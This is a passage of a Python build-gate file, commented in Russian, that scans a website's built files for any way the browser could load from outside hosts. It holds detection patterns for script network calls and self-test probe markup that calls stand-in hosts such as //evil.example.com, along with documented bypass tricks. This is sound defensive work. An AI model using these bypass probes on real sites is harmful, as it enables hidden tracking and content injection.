# -*- coding: utf-8 -*-
"""Гейты KeepsUntil. Читают СОБРАННЫЕ файлы, а не намерения генератора.

ПОЧЕМУ ИМЕННО ТАК. Гейты у нас уже дважды были зелёными на сломанном сайте:
один искал внешние адреса по «http» и пропустил src вообще без схемы, за
которым браузер честно ушёл; другой сверял вывод с той самой функцией, которая
его и считала, и остался зелёным, когда функцию сломали. Поэтому здесь:

  · каждый гейт получает СЛОВАРЬ ОТДАННЫХ ФАЙЛОВ и больше ничего;
  · `python gates.py --selftest` ломает сборку нарочно и требует, чтобы гейт
    покраснел. Гейт, который ни разу не краснел, не проверен;
  · самопроверка считает ГЕЙТЫ: если их стало меньше, чем объявлено, падает.
    Гейт, переставший запускаться, выглядит ровно как пройденный.

ЯЗЫК САЙТА АНГЛИЙСКИЙ, и это тоже гейт: русский текст однажды уехал у нас на
321 страницу мимо всех структурных проверок.
"""
import base64
import hashlib
import io
import json
import json
import os
import re
import sys
from html import unescape as _entities
from urllib.parse import unquote as _pct

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import foodkeeper as fk  # noqa: E402
import prose as pr  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
DIST = os.path.join(HERE, "dist")
STAMP_DIR = os.path.join(HERE, ".stamps")  # ВНЕ каталога выкладки

TITLE_MAX = 60
DESC_MIN, DESC_MAX = 50, 160
# Потолок исполняемого кода на странице. Поднят с 2048 сознательно и с
# замером: поиск теперь стоит на КАЖДОЙ странице и разбирает запрос на слова
# (множественное число, опечатка в одну букву, точное начало имени вперёд), а
# на странице продукта к нему добавляется календарь. Собранный код — 4271
# байт; потолок держит запас в один блок и не даёт коду расти незаметно.
SCRIPT_MAX = 4608

# Единственный вид `data:`, который странице позволено нести, — встроенная
# иконка. Прежде здесь стоял СПИСОК НАЧАЛ, и в нём был «/». Начало «/»
# совпадает и с «//», то есть с протокол-относительным адресом, и через эту
# одну строку сквозь гейт уезжал `//evil.example.com`. Списка начал больше
# нет: форма адреса разбирается по частям, и «//» отсекается ДО «/».
INLINE_DATA_PREFIX = "data:image/svg+xml"


def _html(files):
    return {p: t for p, t in files.items() if p.endswith(".html")}


def _is_data(attrs):
    """Блок ДАННЫХ, а не кода: браузер его не исполняет. Их два вида —
    указатель поиска и структурные данные. Строка «application/ld+json» не
    содержит «application/json» как подстроку, и старая проверка считала
    схему исполняемым скриптом."""
    return "application/json" in attrs or "application/ld+json" in attrs


# ------------------------------------------------------------------- гейты

def g_language(files):
    """Ни одной кириллической буквы ни в одном отданном файле."""
    bad, seen = [], 0
    for p, t in files.items():
        seen += 1
        hits = re.findall(r"[Ѐ-ӿ]+", t)
        if hits:
            bad.append("%s: %s" % (p, ", ".join(hits[:3])))
    return (bad or _seen(seen, "отданных файлов"))[:8]


def g_control_chars(files):
    """Управляющие байты. Эскейп, ставший 0x01, у нас уже печатался на живой
    странице как «F4D8»."""
    bad, seen = [], 0
    for p, t in files.items():
        seen += 1
        for ch in t:
            if ord(ch) < 0x20 and ch not in "\n\t":
                bad.append("%s: байт 0x%02X" % (p, ord(ch)))
                break
    return (bad or _seen(seen, "отданных файлов"))[:8]


def _outbound_allowed():
    """Единственные чужие адреса, которые вообще разрешены, и каждый назван.

    Их ровно два вида, и оба объявлены не здесь, а в сборке: адрес источника
    (страница метода обязана дать проверить числа — сайт про безопасность
    еды, который просит верить и не даёт сходить к источнику, врёт самой
    своей формой) и адреса рекламной сети, когда она включена.
    """
    import render as rd
    links = {rd.SOURCE_URL, rd.source_meta()["url"]}
    return links


def _resource_origins():
    """Чужие ОРИГИНЫ, за которыми браузеру позволено пойти САМОМУ.

    Список оригинов, а не список начал. Начало «/» совпадало и с «//», то
    есть с протокол-относительным адресом, и одна эта строка пропускала
    `//evil.example.com` сквозь гейт, названный «браузер не ходит наружу».
    Свой домен назван здесь ЯВНО, а не угадан по ведущему слэшу.
    """
    import render as rd
    own = ("https://%s" % DOMAIN_HINT[0],)
    extra = tuple(rd.AD_ORIGINS[rd.AD_NETWORK]) if rd.AD_NETWORK else ()
    return tuple(o.lower() for o in own + extra)


# ---------------------------------------- чем страница уводит браузер наружу
#
# Разметка разбирается на теги и атрибуты СВОИМИ ГЛАЗАМИ, а не отдельной
# регуляркой на каждую несущую. Причина простая: карточка «какой атрибут у
# какого элемента» объявлена в render.FETCH_CARRIERS один раз, а значение
# нужно увидеть при ЛЮБЫХ кавычках — `src="//x"`, `src='//x'` и `src=//x`
# грузят одинаково, и регулярка на двойные кавычки видит одну треть.
_Q, _A = chr(34), chr(39)

_TAG_RE = re.compile(
    r"<([a-zA-Z][-a-zA-Z0-9:]*)((?:%s[^%s]*%s|%s[^%s]*%s|[^>%s%s])*)>"
    % (_Q, _Q, _Q, _A, _A, _A, _Q, _A), re.S)
_ATTR_RE = re.compile(
    r"([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*"
    r"(?:%s([^%s]*)%s|%s([^%s]*)%s|([^\s%s%s=<>`]+))"
    % (_Q, _Q, _Q, _A, _A, _A, _Q, _A), re.S)

# rel, при котором браузер идёт по адресу САМ, не дожидаясь клика.
_PREFETCH_REL = ("preload", "prefetch", "preconnect", "dns-prefetch",
                 "modulepreload", "prerender", "subresource")

# meta, чей content — адрес.
_META_URL_KEYS = ("og:image", "og:image:url", "og:image:secure_url", "og:url",
                  "og:audio", "og:video", "twitter:image", "twitter:player",
                  "msapplication-tileimage", "msapplication-config",
                  "thumbnail", "image_src")

# Скрипт, который ходит в сеть НА ХОДУ. Здесь проверяется не адрес, а сам
# приём: адрес такой скрипт собирает из кусков, и разбирать его нечем.
#
# ЭТА ЖЕ ТАБЛИЦА ЧИТАЕТ АТРИБУТ-ОБРАБОТЧИК. Она применялась к телу <script>
# и к отданному «.js» — и ни к чему больше, а `onclick="fetch(…)"` не был
# несущей ВООБЩЕ: чтобы вынести запрос со страницы, хватало перенести его на
# три слова левее. Обработчик — это скрипт, и другого он не бывает.
_JS_FETCH = (
    ("fetch()", r"\bfetch\s*\("),
    ("XMLHttpRequest", r"\bXMLHttpRequest\b"),
    ("sendBeacon", r"\bsendBeacon\s*\("),
    ("Worker", r"\b(?:Shared)?Worker\s*\("),
    ("importScripts", r"\bimportScripts\s*\("),
    ("EventSource", r"\bEventSource\s*\("),
    ("WebSocket", r"\bWebSocket\s*\("),
    ("RTCPeerConnection", r"\bRTCPeerConnection\s*\("),
    ("динамический import()", r"\bimport\s*\("),
    ("присваивание .src", r"\.\s*src\s*="),
    ("присваивание .srcset", r"\.\s*srcset\s*="),
    ("new Image()", r"\bnew\s+Image\s*\("),
    # Элементы, которые грузят САМИ, как только им дадут адрес. `input`,
    # `form` и `a` сюда не входят: поиск на каждой странице создаёт поле
    # ввода и ссылку, и это не запрос. Адрес им всё равно не подсунуть
    # молча — присваивание .src и setAttribute проверяются отдельно.
    ("createElement загружающего элемента",
     r"createElement\s*\(\s*[%s%s]\s*(?:script|img|iframe|link|object|embed"
     r"|source|video|audio|track|use|image|portal|frame|applet)\s*[%s%s]"
     % (_Q, _A, _Q, _A)),
    ("setAttribute загружающего атрибута",
     r"setAttribute\s*\(\s*[%s%s]\s*(?:src|srcset|href|data|poster|action"
     r"|formaction|ping|background|imagesrcset|xlink:href)\s*[%s%s]"
     % (_Q, _A, _Q, _A)),
    # СТАТИЧЕСКИЙ import грузит ровно так же, как динамический, и скобки
    # в нём нет: `import x from "//evil"` уходил мимо регулярки на `import(`.
    ("статический import ... from",
     r"\bimport\s[^;(){}]*?\bfrom\s*[%s%s]" % (_Q, _A)),
    ("import одним адресом", r"\bimport\s*[%s%s]" % (_Q, _A)),
    ("export ... from", r"\bexport\b[^;]*?\bfrom\s*[%s%s]" % (_Q, _A)),
    # УХОД СТРАНИЦЫ ЦЕЛИКОМ — тоже уход браузера на чужой хост, и для
    # обещания приватности он хуже картинки: уезжает не запрос, а читатель.
    # Ссылке это не родня: по ссылке человек ИДЁТ САМ, а здесь его увозят.
    ("присваивание location", r"\blocation\s*(?:\.\s*href\s*)?=(?!=)"),
    ("location.assign/replace", r"\blocation\s*\.\s*(?:assign|replace)\s*\("),
    ("window.open", r"\bopen\s*\(\s*[%s%s]" % (_Q, _A)),
    ("document.write", r"document\s*\.\s*write"),
)

_SCHEME_RE = re.compile(r"^[a-zA-Z][a-zA-Z0-9+.-]*:")
_HOSTLIKE_RE = re.compile(
    r"^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9-]+)+(:[0-9]+)?([/?#]|$)")
_QUOTED_RE = re.compile(r"[%s%s]([^%s%s]*)[%s%s]" % (_Q, _A, _Q, _A, _Q, _A))


def _tags(t):
    """Теги страницы: (имя элемента, {атрибут: значение})."""
    for m in _TAG_RE.finditer(t):
        yield m.group(1).lower(), _tag_attrs(m.group(2))


def _css_urls(blob):
    """url() и image-set() — всё, за чем стиль посылает браузер.

    ЗДЕСЬ БЫЛА ДЫРА, И НАШЛА ЕЁ НЕ САМОПРОВЕРКА, А АТАКА. Строка выше
    ОБЕЩАЛА image-set, а код искал одно `url(`. Между тем `image-set` берёт
    и голую строку: `background:image-set("//evil" 1x)` не содержит ни одной
    скобки `url(` — и уходил мимо гейта, названного «браузер не ходит
    наружу», в обоих носителях: и в элементе `style`, и в атрибуте.
    Объявление, обещающее больше, чем делает код, хуже отсутствующего: на
    него рассчитывают.
    """
    out = [u.strip().strip(_Q + _A)
           for u in re.findall(r"url\(\s*([^)]*?)\s*\)", blob, re.I)]
    for m in re.finditer(r"(?:-[a-z]+-)?image-set\s*\(([^)]*)\)", blob, re.I):
        out.extend(x.strip() for x in _QUOTED_RE.findall(m.group(1))
                   if x.strip())
    return out


def _map_urls(body):
    """Адреса из карты модулей `<script type=importmap>`.

    Ключ карты — ИМЯ, значение — адрес: сверяются ЗНАЧЕНИЯ, иначе «imports»
    само стало бы адресом. Разобрать не вышло — берём все строки в кавычках:
    сломанная карта не повод не смотреть.
    """
    try:
        data = json.loads(body)
    except Exception:
        return [x for x in _QUOTED_RE.findall(body) if x.strip()]
    out = []

    def walk(v):
        if isinstance(v, dict):
            for x in v.values():
                walk(x)
        elif isinstance(v, list):
            for x in v:
                walk(x)
        elif isinstance(v, str) and v.strip():
            out.append(v)
    walk(data)
    return out


def _text_urls(blob):
    """Адреса в отданном файле, который НЕ разметка: карта сайта, robots,
    данные.

    Объявление пространства имён адресом не является: по `xmlns` браузер не
    идёт, а стоит оно в каждой карте сайта. Всё остальное, похожее на адрес,
    проверяется наравне с разметкой.
    """
    b = re.sub(r"xmlns(:[a-zA-Z]+)?\s*=\s*[%s%s][^%s%s]*[%s%s]"
               % (_Q, _A, _Q, _A, _Q, _A), " ", blob)
    return re.findall(r"(?:[a-zA-Z][a-zA-Z0-9+.-]*:)?//[^\s%s%s<>)]+"
                      % (_Q, _A), b)


def _css_imports(blob):
    """@import — и через url(), и голой строкой. Голая строка и была дырой:
    искали url(, а `@import "https://…"` не содержит ни одной скобки."""
    out = []
    for m in re.finditer(r"@import([^;]*)(?:;|$)", blob, re.I | re.S):
        piece = m.group(1)
        out.extend(_css_urls(piece))
        out.extend(x for x in _QUOTED_RE.findall(piece) if x.strip())
    return out


def _meta_values(at):
    """Адрес внутри meta: обновление страницы и карточки шаринга."""
    key = (at.get("name") or at.get("property")
           or at.get("itemprop") or "").lower()
    if (at.get("http-equiv") or "").lower() == "refresh":
        m = re.search(r"url\s*=\s*(.+)$", at.get("content", ""), re.I | re.S)
        return [(m.group(1).strip().strip(_Q + _A), "res")] if m else []
    if key in _META_URL_KEYS:
        return [(at.get("content", ""), "res")]
    return []


def _carrier_values(kind, raw, at, carriers, depth):
    """Из сырого значения — список адресов и того, кто по ним пойдёт:
    `res` идёт браузер сам, `link` — человек кликом."""
    if kind == "url":
        return [(raw, "res")]
    if kind == "link":
        return [(raw, "link")]
    if kind == "prefetch":
        rel = (at.get("rel") or "").lower().split()
        return [(raw, "res")] if any(r in _PREFETCH_REL for r in rel) else []
    if kind == "srcset":
        out = []
        for cand in raw.split(","):
            parts = cand.strip().split()
            if parts:
                out.append((parts[0], "res"))
        return out
    if kind == "list":
        return [(u, "res") for u in raw.split() if u]
    if kind == "css":
        # Значение АТРИБУТА браузер получает уже расшифрованным: `&quot;` в
        # нём — обычная кавычка. Без расшифровки `image-set(&quot;//evil&quot;)`
        # уходил мимо, хотя тот же приём в одинарных кавычках ловился: гейт,
        # ловящий одну запись формы из двух, — это половина гейта.
        css = _entities(raw)
        return [(u, "res") for u in _css_urls(css) + _css_imports(css)]
    if kind == "meta":
        return _meta_values(at)
    if kind == "js_attr":
        # Атрибут-обработчик — это СКРИПТ. Значение атрибута браузер
        # получает уже расшифрованным: мнемоника в нём — обычный знак, и
        # `onclick="fetch(&#39;…&#39;)"` работает точно так же.
        return [(mark, "js") for mark, rx in _JS_FETCH
                if re.search(rx, _entities(raw))]
    if kind == "csp":
        if (at.get("http-equiv") or "").lower() != "content-security-policy":
            return []
        return [(u, "res") for u in _csp_report_urls(_entities(raw))]
    if kind == "semilist":
        # SMIL перечисляет значения через точку с запятой, и любое из них
        # может оказаться адресом: `<animate attributeName="href" to=…>`
        # подменяет адрес уже нарисованной картинке.
        return [(u.strip(), "res") for u in raw.split(";") if u.strip()]
    if kind == "html":
        # srcdoc несёт РАЗМЕТКУ, и она грузит сама по себе. Разбирается тем
        # же списком: иначе несущая, закрытая снаружи, открыта внутри.
        if depth > 2:
            return []
        return [(v, m) for _k, _h, v, m
                in _fetch_points(_entities(raw), carriers, depth + 1)]
    return []


def _fetch_points(t, carriers, depth=0):
    """КАЖДОЕ место разметки, откуда браузер может уйти, — по объявленному
    списку несущих и только по нему."""
    out = []
    by_attr, wild = {}, []
    for key, attrs, tags, kind, human in carriers:
        for a in attrs:
            # Имя, кончающееся звёздочкой, — НАЧАЛО имени, а не имя. Иначе
            # объявить «любой обработчик» было бы нечем: их не список, их
            # открытое семейство, и перечислять его по памяти — ровно та
            # ошибка, из-за которой этой таблицы когда-то не было вовсе.
            if a.endswith("*"):
                wild.append((a[:-1], key, tags, kind, human))
            else:
                by_attr.setdefault(a, []).append((key, tags, kind, human))
    for tag, at in _tags(t):
        for a, raw in at.items():
            hits = list(by_attr.get(a, ()))
            hits += [(k, tg, kd, h) for pre, k, tg, kd, h in wild
                     if a.startswith(pre)]
            for key, tags, kind, human in hits:
                if tags and tag not in tags:
                    continue
                out.extend((key, human, v, m) for v, m
                           in _carrier_values(kind, raw, at, carriers, depth))
    for key, _at, _tg, kind, human in carriers:
        if kind in ("css_text", "css_import"):
            pull = _css_urls if kind == "css_text" else _css_imports
            for blob in re.findall(r"<style[^>]*>(.*?)</style>", t, re.S):
                out.extend((key, human, u, "res") for u in pull(blob))
        elif kind in ("importmap", "speculation"):
            # Карта модулей адресов не грузит сама — она их НАЗНАЧАЕТ, и по
            # ним уйдёт каждый последующий import. Для обещания «браузер
            # никуда не идёт» это тот же чужой хост, вписанный в страницу.
            # Правила предзагрузки того же рода, только хуже: по ним браузер
            # уходит САМ и ЗАРАНЕЕ, ещё до клика.
            want = "importmap" if kind == "importmap" else "speculationrules"
            for a3, body3 in re.findall(r"<script([^>]*)>(.*?)</script>",
                                        t, re.S):
                if want not in a3.lower():
                    continue
                out.extend((key, human, u, "res") for u in _map_urls(body3))
        elif kind == "js":
            for a2, body in re.findall(r"<script([^>]*)>(.*?)</script>",
                                       t, re.S):
                if _is_data(a2):
                    continue
                for mark, rx in _JS_FETCH:
                    if re.search(rx, body):
                        out.append((key, human, mark, "js"))
    return out


def _origin_verdict(low, origins, why):
    """Свой это оригин или чужой. Сравнение по ОРИГИНУ целиком: «начинается
    на наш домен» пропускает `https://keepsuntil.com.evil.example.com`."""
    for o in origins:
        host = o.split("//", 1)[-1].rstrip("/")
        for form in (o.rstrip("/"), "//" + host):
            if low == form or low.startswith(form + "/") \
                    or low.startswith(form + "?") \
                    or low.startswith(form + "#"):
                return None
    return why


def _b64_text(payload):
    """Нагрузка, объявленная как base64, — так, как её развернёт БРАУЗЕР.

    base64url тоже base64: браузеры читают и его, а «-» и «_» вместо «+» и
    «/» — ровно тот способ записи, которым обход и записывают. Хвостовые
    «=» дописываются: длина строки в атрибуте бывает какой угодно.
    """
    s = re.sub(r"\s+", "", payload).replace("-", "+").replace("_", "/")
    s = s.rstrip("=")
    s += "=" * (-len(s) % 4)
    try:
        return base64.b64decode(s, validate=False).decode("utf-8", "replace")
    except Exception:
        return ""


def _data_verdict(u, depth=0):
    """`data:` — тоже несущая: внутри бывает разметка, которая грузит.

    РАЗВОРАЧИВАТЬ НАДО ВСЁ, ЧТО РАЗВЕРНЁТ БРАУЗЕР. Здесь снимались проценты
    и мнемоники — и не снимался base64, хотя объявить его имеет право сам
    адрес: `data:image/svg+xml;base64,…`. Список меток честно просматривал
    base64-текст и честно не находил в нём ничего, а ТА ЖЕ нагрузка в
    процентах ловилась — то есть один и тот же гейт доказывал и умысел, и
    свой обход.

    Рекурсия тут не украшение: `data:` вкладывается в `data:`, и проверить
    первую обёртку — значит проверить обёртку, а не нагрузку.
    """
    head, _sep, payload = u.partition(",")
    if not head.lower().startswith(INLINE_DATA_PREFIX):
        return "data: не объявленного вида (%s)" % head[:40]
    p = _pct(payload)
    if ";base64" in head.lower():
        p = _b64_text(p)
        if not p.strip():
            return "встроенная картинка объявлена base64 и не разбирается"
    p = _entities(p)
    # Объявление пространства имён запросом не является: адрес w3.org стоит
    # в КАЖДОЙ встроенной иконке, и без этой строки гейт краснел бы на себе.
    p = re.sub(r"xmlns(:[a-zA-Z]+)?\s*=\s*[%s%s][^%s%s]*[%s%s]"
               % (_Q, _A, _Q, _A, _Q, _A), " ", p)
    low = p.lower()
    for mark in ("<script", "src=", "url(", "@import", "http://", "https://",
                 "//", "xlink:href", "href=", "<foreignobject", "<iframe",
                 "<image", "<use"):
        if mark in low:
            return "во встроенной картинке спрятан запрос (%s)" % mark
    # Вложенный `data:` разворачивается ТОЙ ЖЕ функцией и теми же метками.
    if depth < 3:
        for nested in re.findall(r"data:[^\s%s%s()<>]+" % (_Q, _A), p, re.I):
            why = _data_verdict(nested, depth + 1)
            if why:
                return "внутри встроенной картинки: %s" % why
    return None


def _csp_report_urls(blob):
    """Адреса, по которым САМА политика безопасности отправляет отчёт.

    Политика — средство против чужих загрузок, и `report-uri` внутри неё
    есть чужая загрузка, разрешённая самим средством. В <meta> браузер эти
    директивы игнорирует, но написанное в странице читается как
    действующее, а завтра та же строка уедет в заголовок хоста.
    """
    out = []
    for piece in blob.split(";"):
        w = piece.split()
        if w and w[0].lower() in ("report-uri", "report-to"):
            out.extend(w[1:])
    return out


def _fetch_verdict(raw, mode, origins, out_ok):
    """Причина, по которой браузер уйдёт с нашего домена, или None.

    ПОРЯДОК ЗДЕСЬ И ЕСТЬ ПРАВИЛО. «//» разбирается ДО «/», иначе
    протокол-относительный адрес считается своим путём — ровно это и
    случилось.
    """
    u = re.sub(r"[\x00-\x1f\x7f]", "", _entities(raw)).strip()
    u = u.replace(chr(92), "/")   # обратный слэш браузер читает как прямой
    if not u:
        return "пустой адрес"
    low = u.lower()
    if low.startswith("//"):
        return _origin_verdict(low, origins, "протокол-относительный адрес")
    if low.startswith("#") or low.startswith("?"):
        return None
    if low.startswith("mailto:") or low.startswith("tel:"):
        return None if mode == "link" else "почта там, где браузер идёт сам"
    if low.startswith("data:"):
        return _data_verdict(u)
    if low.startswith("/"):
        return None
    if _SCHEME_RE.match(u):
        if low.startswith(("javascript:", "vbscript:")):
            return "исполняемый адрес"
        if low.startswith(("blob:", "filesystem:")):
            return "непроверяемый адрес"
        if mode == "link" and u in out_ok:
            return None
        return _origin_verdict(low, origins, "чужой адрес со схемой")
    if _HOSTLIKE_RE.match(low):
        return "имя хоста без схемы"
    return "адрес не от корня сайта"


def _serve_kind(path):
    """Вид разбора для ОТДАННОГО файла — по объявлению render.SERVED_KINDS.

    `None` значит «вид не объявлен», и это провал, а не умолчание: файл,
    который никто не разбирает, обязан ронять сборку, а не тихо уезжать на
    сайт.
    """
    import render as rd
    base = os.path.basename(path).lower()
    ext = os.path.splitext(path)[1].lower()
    for e, kind, _why in rd.SERVED_KINDS:
        # Полное имя проверяется ПЕРВЫМ: у файла без расширения `ext` пуст,
        # и сверка по нему совпала бы с чем угодно таким же безрасширенным.
        if e == base or (e.startswith(".") and e == ext):
            return kind
    return None


def _file_points(path, t):
    """Места ухода наружу в ЛЮБОМ отданном файле — по его объявленному виду.

    ОБЛАСТЬ ГЕЙТА — ЧАСТЬ ГЕЙТА, и здесь она была второй дырой той же волны.
    Гейт внешних адресов читал `_html(files)`: только страницы. Пока выкладка
    — страницы, карта и robots, разницы не видно; файл стиля, картинка SVG
    или указатель в `.js`, положенные сборкой рядом, уехали бы на сайт
    НЕПРОЧИТАННЫМИ — а обещание приватности говорит про всё, что грузит
    браузер, а не про часть выкладки.

    Возврат `None` — «вид файла не объявлен»: зовущий обязан покраснеть.
    """
    import render as rd
    kind = _serve_kind(path)
    if kind is None:
        return None
    if kind == "markup":
        return _fetch_points(t, rd.FETCH_CARRIERS)
    if kind == "css":
        return [("css_url", "url(), @import и image-set в отданном файле "
                 "стиля", u, "res")
                for u in _css_urls(t) + _css_imports(t)]
    if kind == "js":
        return [("js_fetch", "приём сети в отданном файле скрипта", mark,
                 "js") for mark, rx in _JS_FETCH if re.search(rx, t)]
    if kind == "urls":
        return [("text_url", "адрес в отданном файле данных", u, "res")
                for u in _text_urls(t)]
    return []


def g_no_external(files):
    """Всё, за чем браузер идёт САМ, — своё. Ссылка, по которой ходит человек,
    — отдельный вопрос и отдельный список.

    ЧТО ЗДЕСЬ БЫЛО СЛОМАНО. Гейт знал три несущих (`src`, `url()`, `href` у
    `link`) и держал «/» среди разрешённых начал. Замер по тридцати пяти
    способам утащить браузер дал ТРИДЦАТЬ ПРОПУЩЕННЫХ: протокол-относительные
    `img`, `iframe`, `link`, `url()` и даже `<script src="//evil">`, а сверх
    того `srcset`, `action`, `poster`, `object data`, `ping`, `imagesrcset`,
    `xlink:href`, `formaction`, `base`, `meta refresh`, `srcdoc`, `@import`
    строкой и `fetch()` прямо в скрипте. При этом СОБСТВЕННЫЙ контроль гейта
    работал: `https://evil…` он ловил. Гейт с рабочим контролем, мимо
    которого проходит настоящий случай, — это не полугейт, а зелёный свет.
    И он ещё и подделывал страницу приватности, которая говорит не о наших
    намерениях, а о том, ЧТО ГРУЗИТ БРАУЗЕР.

    Теперь несущие перечислены в render.FETCH_CARRIERS — по перечню
    URL-несущих атрибутов HTML, а не по памяти, — оттуда же печатается число
    в политике, и у КАЖДОЙ строки списка своя поломка в самопроверке.

    ВТОРАЯ ВОЛНА, найденная атакой по тем же правилам, закрыла ещё четыре
    прохода мимо работающего контроля:

      · `image-set("//evil" 1x)` — объявление обещало image-set, а код искал
        одно `url(`;
      · `import x from "//evil"` в модуле — регулярка знала только `import(`;
      · `location = "//evil"` и `window.open` — уезжает не запрос, а сам
        читатель, и для обещания приватности это хуже картинки;
      · `<script type=importmap>` — адреса, по которым уйдёт каждый
        последующий import.

    А главное — ОБЛАСТЬ: гейт читал `.html` и только его. Теперь он читает
    КАЖДЫЙ отданный файл по объявленному виду (render.SERVED_KINDS), и файл
    с необъявленным расширением роняет сборку: непрочитанный файл выглядит
    ровно как чистый.

    Разделение сохранено и уточнено:

      · РЕСУРС — браузер идёт туда без спроса: только свой оригин и
        объявленные оригины рекламной сети;
      · ССЫЛКА (`a`, `area`) — человек идёт туда по клику: свой оригин,
        почта, якорь и объявленный список внешних цитат;
      · `a` с rel=preload/prefetch/preconnect/dns-prefetch — это РЕСУРС, а не
        ссылка: браузер идёт туда сам.

    Пустая выборка — провал, и считается она ОТДЕЛЬНО ПО КАЖДОМУ ВИДУ
    файла. Одной общей цифры мало, и это выяснилось не рассуждением: поломка
    «сканер ослеп на все несущие» перестала ломать ровно тогда, когда гейт
    вышел за `.html`. Разметка молчала, а карта сайта и robots держали общую
    выборку непустой — слепой сканер выглядел пройденным. Ноль в любом виде
    теперь провал.
    """
    bad, by_kind = [], {}
    origins = _resource_origins()
    out_ok = _outbound_allowed()
    if not files:
        return ["ни одного отданного файла"]
    for p, t in sorted(files.items()):
        pts = _file_points(p, t)
        if pts is None:
            bad.append("%s: вид файла не объявлен в render.SERVED_KINDS — "
                       "гейт его не читал" % p)
            continue
        kind = _serve_kind(p)
        by_kind.setdefault(kind, 0)
        for _key, human, val, mode in pts:
            by_kind[kind] += 1
            if mode == "js":
                bad.append("%s: %s — скрипт ходит в сеть на ходу" % (p, val))
                continue
            why = _fetch_verdict(val, mode, origins, out_ok)
            if why:
                bad.append("%s: %s (%s) — %s"
                           % (p, why, human[:40], val[:60]))
        if len(bad) > 40:
            break
    if bad:
        return bad[:8]
    out = []
    for kind in sorted(by_kind):
        out += _seen(by_kind[kind],
                     "мест ухода наружу в файлах вида «%s»" % kind)
    return out[:8]


def _tag_attrs(blob):
    """Атрибуты из куска «<тег ЗДЕСЬ>» при ЛЮБЫХ кавычках: `x="1"`, `x='1'`
    и `x=1` браузер читает одинаково, а регулярка на двойные кавычки видит
    одну запись из трёх."""
    attrs = {}
    for a in _ATTR_RE.finditer(blob):
        v = a.group(2)
        if v is None:
            v = a.group(3)
        if v is None:
            v = a.group(4)
        attrs[a.group(1).lower()] = v if v is not None else ""
    return attrs


def g_own_resources_exist(files):
    """Свой адрес, за которым браузер идёт САМ, обязан существовать.

    ОБЛАСТЬ ГЕЙТА — ЧАСТЬ ГЕЙТА. Гейт внутренних ссылок читает только `href`,
    то есть путь, по которому идёт ЧЕЛОВЕК, и делает это правильно. Ресурса
    — `src`, `poster`, `data`, `url()`, `srcset` — он не смотрел вовсе, а
    битая картинка молчаливее битой ссылки: по ссылке хотя бы видно, что её
    нажали, а картинка просто не приходит. Здесь область снята с того же
    объявленного списка несущих, что и у гейта внешних адресов.

    Смотрятся ВСЕ ресурсные точки, а проверяются на существование те, что
    ведут на свой путь: гейт обязан назвать, сколько он посмотрел, и число
    это — не число найденных путей, а число мест, куда он заглянул.

    ВЫБОРКА СЧИТАЕТСЯ ПО ВИДАМ ФАЙЛОВ, и это не украшение. Поломка «убрать
    все страницы» перестала ломать ровно тогда, когда гейт вышел за `.html`:
    разметка молчала, а карта сайта держала общую цифру непустой, и слепой
    сканер выглядел пройденным. Ноль в любом присутствующем виде — провал.
    """
    have = set()
    for p in files:
        have.add("/" + p)
        if p.endswith("index.html"):
            have.add("/" + p[:-len("index.html")])
    bad, by_kind = [], {}
    if not files:
        return ["ни одного отданного файла"]
    for p, t in sorted(files.items()):
        by_kind.setdefault(_serve_kind(p), 0)
        for _k, human, val, mode in (_file_points(p, t) or ()):
            if mode != "res":
                continue
            by_kind[_serve_kind(p)] += 1
            u = re.sub(r"[\x00-\x1f\x7f]", "", _entities(val)).strip()
            u = u.replace(chr(92), "/")
            if not u.startswith("/") or u.startswith("//"):
                continue
            path = u.split("#")[0].split("?")[0]
            if path not in have:
                bad.append("%s: %s ведёт в никуда — %s"
                           % (p, human[:34], path[:50]))
    if bad:
        return sorted(set(bad))[:8]
    out = []
    for kind in sorted(k for k in by_kind if k is not None):
        out += _seen(by_kind[kind], "ресурсных точек в файлах вида «%s»"
                     % kind)
    return out[:8]


def _carrier_probe(attrs, tags, kind, evil):
    """Крошечная разметка, уводящая браузер наружу ИМЕННО этой несущей.

    Собирается ИЗ ОБЪЯВЛЕНИЯ: смысл гейта ниже — поймать несущую, которую
    объявили и забыли научиться читать.
    """
    if kind == "css_text":
        return "<style>b{background:url(%s)}</style>" % evil
    if kind == "css_import":
        return "<style>@import %s%s%s;</style>" % (_Q, evil, _Q)
    if kind == "js":
        return "<script>fetch(%s%s%s)</script>" % (_Q, evil, _Q)
    if kind == "importmap":
        return ('<script type=%simportmap%s>{%simports%s:{%sa%s:%s%s%s}}'
                '</script>' % (_Q, _Q, _Q, _Q, _Q, _Q, _Q, evil, _Q))
    if kind == "speculation":
        return ('<script type=%sspeculationrules%s>{%sprerender%s:'
                '[{%surls%s:[%s%s%s]}]}</script>'
                % (_Q, _Q, _Q, _Q, _Q, _Q, _Q, evil, _Q))
    if kind == "js_attr":
        return '<div onclick=%sfetch(%s%s%s)%s></div>' % (_Q, _A, evil, _A, _Q)
    if kind == "csp":
        return ('<meta http-equiv=%sContent-Security-Policy%s '
                'content=%sdefault-src %snone%s; report-uri %s%s>'
                % (_Q, _Q, _Q, _A, _A, evil, _Q))
    if kind == "meta":
        return '<meta property="og:image" content="%s">' % evil
    tag = (tags or ("div",))[0]
    val = evil
    if kind == "srcset":
        val = "%s 1x" % evil
    elif kind == "css":
        val = "background:url(%s)" % evil
    elif kind == "html":
        val = "&lt;img src=%s&gt;" % evil
    extra = ' rel="preconnect"' if kind == "prefetch" else ""
    body = " ".join('%s="%s"' % (a, val) for a in attrs)
    return "<%s %s%s></%s>" % (tag, body, extra, tag)


def g_carriers_are_scanned(files):
    """У КАЖДОЙ объявленной несущей есть работающий сканер.

    Слабым местом гейта про внешние адреса была не логика, а ОБЛАСТЬ: он
    ловил ровно то, что перечислял, а перечислял три вещи из тридцати пяти,
    и при этом его собственный контроль (`https://evil…`) исправно краснел.
    Гейт с рабочим контролем, мимо которого проходит настоящий случай, —
    это зелёный свет, а не полугейт.

    Поэтому список несущих объявлен в render.FETCH_CARRIERS, а этот гейт на
    КАЖДОЙ сборке проверяет две вещи: сканер видит каждый объявленный ключ, и
    на каждом ключе чужой адрес получает отказ. Ключ, добавленный в
    объявление и не прочитанный сканером, теперь роняет сборку, а не тихо
    расширяет обещание в политике.

    ЧЕГО ЭТОТ ГЕЙТ НЕ ДОКАЗЫВАЕТ — что список полон: свой ввод он строит из
